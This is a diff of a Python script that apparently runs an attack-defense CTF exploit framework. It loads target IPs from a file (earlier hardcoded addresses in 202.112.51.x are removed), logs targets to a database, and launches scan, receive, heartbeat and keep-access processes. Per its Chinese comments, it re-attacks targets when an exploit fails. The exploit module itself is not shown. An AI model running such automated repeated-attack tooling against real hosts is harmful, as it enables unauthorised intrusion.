@@ -2,24 +2,32 @@
 from exp import *
 import base64
 from multiprocessing import Process
-from suber import *
+from submitter import *
 import threading
 from sqltools import *
 import os
 import time
 
 
+#这里做一些配置设置
+port = 9999 #攻击端口
 
 
 
 
-port = 9999
-targets=["202.112.51.152",\
-"202.112.51.151",\
-"127.0.0.1",
-# "202.112.51.152",\
-]
-tarlist=[]
+
+
+def loadfile2list(filename,mylist):
+    # usage="mylist=[];then loadfile2list("iptables",mylist)"
+    mylist[:]=[]
+    for line in fileinput.input(filename):
+        if line[-1] == "\n":
+            mylist.append(line[:-1])
+        else:
+            mylist.append(line[:])
+    
+    print "load2list done!"
+
 
 def encodefile(filename):
     ufile = open(filename,"r")
@@ -209,6 +217,15 @@ def recv_server():
 
 
 
+
+
+
+####################程序起始位置|程序入口########################
+
+targets=[]
+loadfile2list("iplist.txt",targets)
+tarlist=[]
+
 # init our database
 initdb("./our.db")
 
@@ -226,22 +243,20 @@ p_keepit=Process(target=keepit)
 #如果exploit失败了，那么还是每隔一段时间打过去
 p_stillattack=Process(target=fail_but_attack)
 
+
+
+#准备攻击列表，并初始化数据库
 tarlist=init_target_list(targets)
 for i in tarlist:
     insertdb("./our.db",i[0],i[1],i[2])
 
 
-
+#查看初始化后的数据库
 lookup("./our.db")
-# raw_input()
 
-
+#启动各个配合进程
 print "start listening...."
-
-
-
 p_scan.start()
-# raw_input()
 p_recv.start()
 p_heartbeat.start()
 p_keepit.start()
